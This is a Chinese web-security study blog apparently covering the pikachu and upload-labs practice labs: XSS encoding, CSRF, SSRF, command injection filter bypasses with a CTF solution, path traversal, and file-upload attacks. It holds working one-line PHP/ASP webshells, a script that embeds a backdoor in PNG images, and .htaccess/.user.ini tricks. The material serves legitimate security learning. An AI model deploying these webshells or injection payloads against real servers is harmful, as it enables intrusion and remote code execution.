<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%2F%78%73%73%2F%29&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	上面的编码结果是 半用网站半手动翻 的结果；也可以直接将其转换为十六进制(在前面加个 % 即可)</p>
</li>
<li><p>HTML编码：对 javascript伪协议 和 URL编码后的字符进行HTML编码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x43;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x43;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x43;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x43;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x43;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x32;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x43;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x34;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x32;</span><span class="symbol">&amp;#x38;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x32;</span><span class="symbol">&amp;#x46;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x38;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x32;</span><span class="symbol">&amp;#x46;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x32;</span><span class="symbol">&amp;#x39;</span>&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>锻体</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>pikachu笔记(部分)</title>
    <url>/2022/10/13/101%E2%80%94pikachu/</url>
    <content><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>​	介绍：跨站请求伪造(Cross-site request forgery，缩写为 CSRF 或 XSRF)，与 XSS 不同，XSS 利用站点内的信任用户，CSRF 则伪装成 受信任用户 请求 受信任的网站。</p>
<p>​	<strong>原理</strong>：攻击者利用 目标用户 的身份，以 目标用户 的名义执行某些非法操作，包括：买东西、转账等会泄露个人隐私并威胁到目标用户的安全</p>
<p><strong>GET：</strong></p>
<p>​	几乎所有参数都是通过 GET方式进行请求的，包括用户名、密码和一些个人信息。</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/CSRF-01.jpg"></p>
<p>​	登录账号后，我们可以通过修改 GET请求 中的值来修改个人信息，达到与图形化界面得到相同结果（可惜没多大用）<img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/CSRF-02.jpg"></p>
<p><strong>POST：</strong></p>
<p>​	登陆账号后修改信息，抓包发现个人信息都在报文中，这时我们无法对 URL 进行修改。我们可以自己创建一份报文，让登录 kobe 的用户点击，用户点击后，个人信息就被修改了。</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/CSRF-03.jpg"></p>
<ul>
<li>BP中有个构造 CSRF PoC功能(Engagement tools中，社区版不能用)，它会生成一段 HTML 代码，此代码是 CSRF漏洞的测试代码。</li>
</ul>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/CSRF-04.jpg"></p>
<ul>
<li>复制后，发布到网站中，用户访问后，点击submit按钮后，信息修改成功（不过，这能骗到人吗？至少样子先得做得和真网站 一样吧，虽然我也不知道）</li>
</ul>
<p><strong>防御方法</strong></p>
<ul>
<li><p>验证请求报文中的 Referer 值，若 Referer值是以自己网站开头的域名，说明该请求来自网站自身，是合法的；若值是空或者其他网站域名，则有可能是 CSRF攻击，那么服务器拒绝该请求。（但是能被绕过）</p>
</li>
<li><p>攻击之所以可以成功，是 攻击者 伪造了 用户请求，所以我们可以在请求中放入 攻击者 无法伪造的信息，在 HTTP 请求中加入一个随机产生的token，并在 服务端 验证，如果请求报文中 无token 或token 值错误，则可以视为CRSF攻击而拒绝</p>
</li>
</ul>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>​	介绍：服务器端请求伪造(Server-side request forgery)，一种由 攻击者 构造请求，服务器端 发起请求的漏洞。SSRF攻击的目标是 外网无法访问的 内部系统（因为请求是由 请求端 发起的，所以 服务器端 只能请求到与自身相连而与外网隔离的内部系统）</p>
<p>​	<strong>原理</strong>：服务端 提供了 从其他服务器获取数据的功能 且 没有对目标地址进行过滤与限制。比如：攻击者 操作服务端从指定的 URL 地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。</p>
<blockquote>
<p>PHP 中这些函数使用不当会引起 SSRF：file_get_contents() 、fsockopen() 、curl_exec() </p>
<p>curl_exec()函数：执行一个 curl 会话(模拟浏览器请求)</p>
</blockquote>
<p>​	点击超链接后，可以看到其是通过 curl_exec()函数对 GET传参得到 url建立一个 会话(看源码也可以)，因为没进行过滤，所以 url中输入什么都可以(输入baidu.com就会跳转的 百度 的页面)</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/SSRF-01.jpg"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$URL</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$CH</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$URL</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$CH</span>， CURLOPT_HEADER， <span class="literal">FALSE</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$CH</span>， CURLOPT_SSL_VERIFYPEER， <span class="literal">FALSE</span>);</span><br><span class="line"><span class="variable">$RES</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$CH</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$CH</span>) ;</span><br></pre></td></tr></table></figure>

<ul>
<li>比如我们可以访问文本内容</li>
</ul>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/SSRF-02.png"></p>
<ul>
<li>还可以查看其开放的端口，未开放的话就无显示</li>
</ul>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/SSRF-03.png"></p>
<ul>
<li>第二关 file_get_contents 和上一关没太大区别，就不说了</li>
</ul>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>​	介绍：remote command&#x2F;code execute，能使 攻击者 直接向 后台服务器 远程注入 操作系统的命令 或 代码，从而远程控制后台系统</p>
<p><strong>原理</strong></p>
<p><strong>远程系统命令执行</strong>：</p>
<ul>
<li>应用系统 从设计上需要给用户提供 指定的远程命令操作的接口。比如我们常见的路由器、防火墙等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果 设计者 在完成该功能时，没有做严格的安全控制，则可能会导致 攻击者 通过该接口提交其他的命令，让后台执行后从而 控制整个后台服务器</li>
</ul>
<p><strong>远程代码执行</strong>：</p>
<ul>
<li>后台有时候也会把用户的输入作为代码的一部分执行，也就造成了 远程代码执行漏洞。 不管是使用了代码执行的函数，还是使用了不安全的反序列化等等。</li>
</ul>
<p><strong>系统命令拼接</strong></p>
<table>
<thead>
<tr>
<th>格式</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>cmd A <strong>;</strong> cmd B</td>
<td>先运行命令A，在运行命令B(二者之间无逻辑联系)</td>
</tr>
<tr>
<td>cmd A <strong>&amp;</strong> cmd B</td>
<td>先后运行命令 A、B</td>
</tr>
<tr>
<td>cmd A <strong>&amp;&amp;</strong> cmd B</td>
<td>命令 A <strong>成功</strong> 运行后，运行 B (不成功则不运行)</td>
</tr>
<tr>
<td>cmd A <strong>|</strong> cmd B</td>
<td>A的输出 作为B的输入</td>
</tr>
<tr>
<td>cmd A <strong>||</strong> cmd B</td>
<td>运行命令 A，成功则不运行 B (失败则运行B)</td>
</tr>
</tbody></table>
<p>​	如果这些 运算符 被过滤了，可以用 %0a(换行符)、%0d(回车符) 来代替</p>
<p><strong>系统命令执行函数</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>() <span class="title function_ invoke__">passthru</span>() <span class="title function_ invoke__">exec</span>() <span class="title function_ invoke__">shell_exec</span>() <span class="title function_ invoke__">popen</span>() <span class="title function_ invoke__">proc_open</span>() <span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line">    exec shell_exec 函数默认无回显，需要手动输出</span><br><span class="line">    <span class="title function_ invoke__">pcntl_exec</span>():Linux下的扩展，需要安装</span><br><span class="line">	通过URL输入命令时要加上【;】 比如 /?cmd=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>空格过滤绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS$1   //$1改成$加其他数字也行，后面加个$与&#123;&#125;类似，起截断作用</span><br><span class="line">$IFS	如果单纯的cat$IFS, bash解释器会把整个IFS当做变量名，输不出来结果，然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">&lt; &lt;&gt;重定向符替换</span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09 (tab)</span><br></pre></td></tr></table></figure>

<p><strong>cat过滤绕过</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ca<span class="string">&#x27;&#x27;</span>t、ca<span class="string">&quot;&quot;</span>t、ca\t 也能绕过</span></span><br><span class="line">tac			#从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more		# 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less		# 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head		# 只显示头几行</span><br><span class="line">tail		# 只显示最后几行</span><br><span class="line">nl			#类似于cat -n，显示时输出行号</span><br><span class="line">tailf		#类似于tail -f</span><br><span class="line">sort		#打印以字母序列进行文本排序</span><br></pre></td></tr></table></figure>

<p><strong>flag 过滤绕过</strong></p>
<ul>
<li><p>禁用flag时，可以用 <code>fl\ag、fl&quot;&quot;ag、fl&#39;&#39;ag</code> 绕过</p>
</li>
<li><p>也可以用 通配符 ? * 来代替 flag，比如 <code>fl* 、 *ag</code> 等等</p>
</li>
<li><p>$@ 和 $N(N为数字0-9)：<code>fl$@ag、fl$1ag、fl$9ag</code> 等等</p>
<ul>
<li>$n代表shell的位置参数，$0：代表命令本身，$1-9：代表第1-9个参数</li>
</ul>
</li>
</ul>
<p><strong>ls 过滤绕过</strong></p>
<ul>
<li>禁用 ls 时，可以用 <code>l\s</code> 绕过</li>
<li>也可以用 <code>dir</code> 代替<del>(之前还以为这是Windows的命令，linux也有啊)</del></li>
</ul>
<p><strong>[GXYCTF2019]Ping Ping Ping</strong>：</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/RCE-01.jpg"></p>
<p>​	几乎过滤了所有的符号；flag贪婪匹配，匹配一个字符串中，是否按顺序出现过 f l a g 四个字母</p>
<p>解决方法：</p>
<ol>
<li><p>内联执行：将 反引号内 命令的 输出 作为 输入 执行(反引号：ESC键下面那个)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat$IFS$1`ls`</span><br></pre></td></tr></table></figure>
</li>
<li><p>源码中有一个变量 $a，可以用其覆盖而拼接flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br><span class="line">	变量 ab 互换传递，实现拼接</span><br><span class="line">/?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</span><br><span class="line">/?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$1$b.php</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="Unsafe-file-download"><a href="#Unsafe-file-download" class="headerlink" title="Unsafe file download"></a>Unsafe file download</h1><ul>
<li>当我们点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称</li>
<li>后台在收到请求后会开始执行下载代码，将该文件名对应的文件 响应 给浏览器，从而完成下载</li>
</ul>
<blockquote>
<p>​	如果后台在收到请求的文件名后，将其直接拼接进 下载文件的路径 中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞</p>
<p>​	若 攻击者 提交的是一个精心构造的路径，则很有可能会直接将该指定的文件下载下来， 从而导致后台敏感信息(密码文件、源代码等)被下载</p>
</blockquote>
<p>​	随便点击一张图片后抓包，发现这是通过 GET请求返回 所要下载的文件，既然如此那么就可以修改它的值，来下载其他的文件</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/filedown-01.png" alt="filedown-01"></p>
<p>​	我们可以通过 BP中 <code>Target</code> 下的 <code>site map</code> 看到 其大概的 文件树结构，想要下载其他文件的话修改文件路径即可(啊，不过要先 ..&#x2F;切出 当前所在的文件夹哟)</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/filedown-02.jpg" alt="filedown-02"></p>
<h1 id="Unsafe-file-upload-文件上传"><a href="#Unsafe-file-upload-文件上传" class="headerlink" title="Unsafe file upload(文件上传)"></a>Unsafe file upload(文件上传)</h1><p>​	大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在进程服务器上执行任意PHP脚本</p>
<p>特殊后缀名绕过： <code>.phtml</code>、<code>.pht</code> 、<code>.php5</code>、<code>.php4</code>、<code>.php3</code>、<code>.php2</code> (<code>.php</code> 后缀若被过滤可以试试)</p>
<p><strong>一句话木马</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php:	&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line">若上面的被过滤:	&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;pass&#x27;]);&lt;/script&gt;</span><br><span class="line">asp:	&lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspx:	&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>eval()函数：把一段字符串当作PHP语句来执行(当然该字符串必须是合法的PHP语句)</p>
</li>
<li><p>@：忽略该语句中可能产生的错误消息(错误控制操作符)</p>
</li>
</ul>
<p>​	AntSword连接一句话原理：通过 POST 方式将我们想要执行操作的 代码(经过了URL编码) 传入到超级全局变量(也就是所谓连接密码)中，然后通过 eval()执行</p>
<p>​	可以用BP抓包，先设置好 蚁剑 的代理，设置好后，就可以用BP抓包了，以下是查看文件时抓的包，可以看到就是发送一段代码来代替了字符串pass，也可以说是用 POST的方式对pass(设置的连接密码)重新进行赋值</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/fileup-01.jpg"></p>
<h2 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a><strong>图片马</strong></h2><blockquote>
<p>前提：含有文件包含漏洞</p>
</blockquote>
<ul>
<li><p>通过使用 getimagesize()函数获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE</p>
<p>​	制作图片马的命令如下</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.png/b + <span class="number">1</span>.php/a shell.png</span><br><span class="line">	# /A： 表示一个 ASCII 文本文件 /b：表示一个二进位文件(<span class="built_in">copy</span>参数)</span><br></pre></td></tr></table></figure>
</li>
<li><p>也有的是用 exif_imagetype() 函数只检查该文件十六进制的前几个字节，直接在 文件开头 添加 相应图片的文件头即可绕过</p>
<ul>
<li>可以用记事本打开该文件，直接在开头添加 图片文件头 的ASCII码</li>
<li>也可以 用十六进制的形式 添加图片文件头</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF：47 49 46 38 39 61(HEX)		GIF89a 或者GIF87a(ASCII)</span><br><span class="line">BMP：42 4D(HEX)		BM(ASCII)</span><br><span class="line">JPG：FF D8</span><br><span class="line">PNG：89 50 4E 47 0D 0A 1A 0A</span><br><span class="line">剩下的两个转换成ASCII后都有不可打印字符(好像是)，无法直接将ASCII码添加到文本中</span><br></pre></td></tr></table></figure>

<h2 id="图片二次渲染"><a href="#图片二次渲染" class="headerlink" title="图片二次渲染"></a>图片二次渲染</h2><h3 id="png上传-IDAT"><a href="#png上传-IDAT" class="headerlink" title="png上传(IDAT)"></a>png上传(IDAT)</h3><p>​	 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并显示出来</p>
<blockquote>
<p>png图片由 3个以上 的数据块组成<br>其有两种类型的数据块，一种是关键数据块（标准数据块），另一种是辅助数据块（可选的数据块）<br>关键数据块定义了3个标准数据块(IHDR,IDAT, IEND)，每个PNG文件都必须包含它们</p>
</blockquote>
<ul>
<li><p>数据块IHDR：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，一个PNG数据流中只能有一个文件头数据块</p>
</li>
<li><p>图像数据块IDAT：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块，IDAT存放着图像真正的数据信息</p>
</li>
<li><p>图像结束数据IEND：用来标记PNG文件或者数据流已经结束，必须要放在文件的尾部。文件结尾12个字节一般是：00 00 00 00 49 45 4E 44 AE 42 60 82</p>
</li>
</ul>
<p>​	使用php脚本写入IDAT数据块（国外大佬写的脚本，直接运行即可，<del>哎，我连个脚本都不会写</del>）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	运行成功后将 1.png 上传（正好试试upload-labs的Pass-17），上传成功后下载图片马到本地，查看在图片中插入的代码为<code>&lt;?$_GET[0]($_POST[1]);?&gt;</code>，看这样子挺眼熟，可以用来执行 system(‘’)命令</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/fileup-03.jpg" alt="fileup-03"></p>
<p>利用文件包含漏洞输入文件的路径后，GET传参 <code>0=system</code>，然后POST传参 <code>1=whoami</code> 即可执行命令</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/fileup-02.jpg" alt="fileup-02"></p>
<h3 id="jpg上传"><a href="#jpg上传" class="headerlink" title="jpg上传"></a>jpg上传</h3><blockquote>
<p>不是所有的 jpg图片 都能被如下这样处理，可以多尝试一些jpg图片</p>
</blockquote>
<p>​	还是国外大牛写的脚本jpg_payload.php，找一个jpg图片，上传至服务器然后再下载到本地保存为<code>1.jpg</code>，用此脚本处理 1.jpg，命令 <code>php jpg_payload.php 1.jpg</code> ，用记事本也可以查看到插入的php代码</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/fileup-04.jpg" alt="fileup-04"></p>
<p>将生成的文件上传成功后，再用文件包含访问此文件，本地测试成功</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/fileup-05.jpg" alt="fileup-05"></p>
<p>例题：</p>
<p>upload-labs Pass-17</p>
<p>参考：</p>
<p><a href="https://xz.aliyun.com/t/2657#toc-5">upload-labs之pass 16详细分析 </a></p>
<p><a href="https://github.com/Yang1k/upload-labs-Pass16">Yang1k&#x2F;upload-labs-Pass16</a></p>
<h2 id="htaccess配置文件绕过"><a href="#htaccess配置文件绕过" class="headerlink" title=".htaccess配置文件绕过"></a>.htaccess配置文件绕过</h2><blockquote>
<p>只能在 Apache 服务器中起作用<br>在 httpd.conf 中启用 AllowOverride</p>
</blockquote>
<p>​	Apache下的一个配置文件，主要负责相关目录下的网页配置，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;1.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"><span class="comment">//在当前目录下，如果匹配到1.jpg文件，则被解析成PHP代码执行</span></span><br></pre></td></tr></table></figure>

<h2 id="user-ini配置文件绕过"><a href="#user-ini配置文件绕过" class="headerlink" title=".user.ini配置文件绕过"></a>.user.ini配置文件绕过</h2><blockquote>
<p>服务器脚本语言为 PHP<br>服务器使用CGI FastCGI模式<br>上传目录下要有可执行的 PHP 文件</p>
</blockquote>
<p>​	用户自定义的php.ini(php默认的配置文件)，通常构造后门和隐藏后门</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_prepend_file = <span class="number">1</span>.jpg					<span class="comment">//表示加载第一个PHP代码之 前 先配置所指示的文件</span></span><br><span class="line">auto_append_file = <span class="number">1</span>.jpg					<span class="comment">//表示加载第一个PHP代码之 后 先配置所指示的文件	</span></span><br></pre></td></tr></table></figure>

<p>​	上传完 <code>.user.ini</code> 后再上传图片马，连接的时候输入的是 上传目录下的 PHP文件(不是图片马)，因为上面的代码相当于执行了 include()函数，将我们上传的图片马包含进去了</p>
<h1 id="Over-Permisson"><a href="#Over-Permisson" class="headerlink" title="Over Permisson"></a>Over Permisson</h1><blockquote>
<p>​	如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 当前用户的权限 进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞</p>
<p>常见越权漏洞：GET、POST传参、cookie……</p>
</blockquote>
<p><strong>水平越权：</strong></p>
<p>指 攻击者 尝试访问与他拥有 相同权限 的用户资源。主要看 A用户 的操作能不能影响到 用户B</p>
<p>​	先登录 lucy 的账户，查看个人信息后发现其是通过 GET传参 进行查找个人信息的(没有进行任何限制)</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/over-01.jpg" alt="over-01"></p>
<p>​	可以试着修改 username 的值，成功在未登录 lili账号的情况下 查看其个人信息，实现水平越权</p>
<p><img src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/100-10N/101/over-02.png" alt="over-02"></p>
<p><strong>部分源码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">connect</span>();</span><br><span class="line"><span class="comment">// 判断是否登录，没有登录不能访问</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">check_op_login</span>(<span class="variable">$link</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:op1_login.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="comment">//没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定</span></span><br><span class="line">    <span class="variable">$username</span>=<span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;select * from member where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="variable">$uname</span>=<span 